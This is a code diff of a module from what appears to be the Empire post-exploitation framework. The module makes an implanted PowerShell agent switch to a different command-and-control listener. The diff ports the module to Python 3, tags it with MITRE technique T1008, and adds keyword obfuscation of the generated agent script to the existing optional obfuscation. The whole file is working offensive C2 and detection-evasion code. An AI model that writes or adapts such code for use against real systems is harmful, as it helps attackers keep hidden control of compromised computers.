@@ -1,16 +1,25 @@
+from __future__ import print_function
+
+from builtins import object
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Spawn',
+            'Name': 'Switch-Listener',
 
             'Author': ['@harmj0y'],
 
             'Description': ('Overwrites the listener controller logic with the agent with the '
                             'logic from generate_comms() for the specified listener.'),
+
+            'Software': '',
+
+            'Techniques': ['T1008'],
 
             'Background' : False,
 
@@ -60,16 +69,19 @@ class Module:
         listenerName = self.options['Listener']['Value']
 
         if listenerName not in self.mainMenu.listeners.activeListeners:
-            print helpers.color("[!] Listener '%s' doesn't exist!" % (listenerName))
+            print(helpers.color("[!] Listener '%s' doesn't exist!" % (listenerName)))
             return ''
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
         listenerOptions = activeListener['options']
 
-        commsCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_comms(listenerOptions=listenerOptions, language='powershell')
+        script = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_comms(listenerOptions=listenerOptions, language='powershell')
 
         # signal the existing listener that we're switching listeners, and the new comms code
-        commsCode = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listenerName, commsCode)
+        script = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listenerName, script)
+
         if obfuscate:
-            commsCode = helpers.obfuscate(self.mainMenu.installPath, psScript=commsCode, obfuscationCommand=obfuscationCommand)
-        return commsCode
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
+        return script
